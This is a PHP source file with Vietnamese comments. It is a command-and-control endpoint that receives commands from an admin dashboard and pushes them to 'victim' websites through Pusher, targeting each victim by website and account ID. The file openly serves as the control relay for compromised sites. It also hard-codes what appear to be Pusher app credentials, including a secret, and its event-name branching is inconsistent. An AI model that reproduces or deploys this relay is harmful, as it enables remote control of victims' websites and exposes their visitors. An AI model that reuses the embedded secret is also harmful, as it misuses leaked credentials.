<?php
// control.php - API nhận control từ dashboard admin và gửi đến victim qua Pusher

// Load Composer autoloader
require_once 'vendor/autoload.php';

// --- Bật hiển thị lỗi (chỉ dùng trong môi trường dev)
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Set headers for CORS and JSON
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Only allow POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit();
}

// Read raw body
$raw = file_get_contents('php://input');

// Decode JSON and check errors
$input = json_decode($raw, true);
if ($input === null && json_last_error() !== JSON_ERROR_NONE) {
    http_response_code(400);
    echo json_encode([
        'error' => 'Invalid JSON input',
        'json_error' => json_last_error_msg()
    ]);
    exit();
}

// Prepare log entry
$logData = [
    'timestamp' => date('Y-m-d H:i:s'),
    'received_raw' => $raw,
    'received_parsed' => $input,
    'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown'
];

// Try write log (check return)
$logResult = @file_put_contents(__DIR__ . '/control_logs.txt', json_encode($logData, JSON_UNESCAPED_UNICODE) . PHP_EOL, FILE_APPEND);
if ($logResult === false) {
    // Không dừng xử lý; chỉ trả warning trong response để bạn biết permission
    $logWriteError = 'Cannot write to control_logs.txt. Check file permissions.';
} else {
    $logWriteError = null;
}

// Pusher configuration
$pusherConfig = [
    'app_id' => '2056311',
    'key' => '049ee983c4ec4cecf834',
    'secret' => '6ee5cb53d3b09e78a6a1',
    'cluster' => 'ap1',
    'useTLS' => true
];

// Function to send control to victim via Pusher
function sendControlToVictim($websiteId, $controlData, $config, $input = null) {
    try {
        // Initialize Pusher client
        $pusher = new Pusher\Pusher(
            $config['key'],
            $config['secret'],
            $config['app_id'],
            [
                'cluster' => $config['cluster'],
                'useTLS' => $config['useTLS'],
                'timeout' => 10
            ]
        );
        
        // Generate event name - use account ID if available, otherwise use website ID
        $eventName = 'control_command';
        if ($input && isset($input['data']['account']['id'])) {
            $eventName = 'control_command_' . $input['data']['account']['id'];
        } elseif ($input && isset($input['data']['account']['ssid'])) {
            $eventName = 'control_command_' . $input['data']['account']['id'];
        } else {
            $eventName = 'control_command_' . $input['data']['account']['id'];
        }
        
        // Send control data to specific website
        $result = $pusher->trigger('receive-control', $eventName, [
            'website_id' => $websiteId,
            'control_data' => $controlData,
            'timestamp' => date('Y-m-d H:i:s')
        ]);
        
        return [
            'success' => true,
            'response' => json_encode($result),
            'http_code' => 200,
            'error' => null
        ];
        
    } catch (Exception $e) {
        return [
            'success' => false,
            'response' => $e->getMessage(),
            'http_code' => 500,
            'error' => $e->getMessage()
        ];
    }
}

// Validate minimal fields
if (!isset($input['type']) || !isset($input['data'])) {
    http_response_code(400);
    echo json_encode(['error' => 'Missing required fields: type and data']);
    exit();
}

// Validate website_id for targeting specific victim
// Extract website ID from the data structure
$websiteId = null;
if (isset($input['website'])) {
    $websiteId = $input['website'];
} elseif (isset($input['data']['account']['website'])) {
    $websiteId = $input['data']['account']['website'];
} else {
    http_response_code(400);
    echo json_encode(['error' => 'Missing required field: website or data.account.website']);
    exit();
}

// Safe processing: avoid calling undefined functions
$result = null;

try {
    $controlType = $input['type'];
    $controlData = $input['data'];
    
    // Send control command to specific website via Pusher
    $pusherResult = sendControlToVictim($websiteId, [
        'type' => $controlType,
        'data' => $controlData
    ], $pusherConfig, $input);
    
    if ($pusherResult['success']) {
        $result = [
            'control_sent' => true,
            'website_id' => $websiteId,
            'control_type' => $controlType,
            'pusher_response' => $pusherResult['response'],
            'message' => 'Control command sent to victim successfully'
        ];
    } else {
        $result = [
            'control_sent' => false,
            'website_id' => $websiteId,
            'control_type' => $controlType,
            'error' => $pusherResult['error'],
            'message' => 'Failed to send control command to victim'
        ];
    }

} catch (Throwable $e) {
    // Bắt mọi exception/fatal trên PHP7+
    http_response_code(500);
    echo json_encode([
        'error' => 'Server error during processing',
        'exception' => $e->getMessage()
    ]);
    exit();
}

// Build response (include log write status for debugging)
$response = [
    'success' => true,
    'message' => 'Data processed successfully',
    'data' => $result,
    'timestamp' => date('Y-m-d H:i:s'),
];

if ($logWriteError) {
    $response['log_warning'] = $logWriteError;
}

// Send response
echo json_encode($response, JSON_UNESCAPED_UNICODE);
exit();

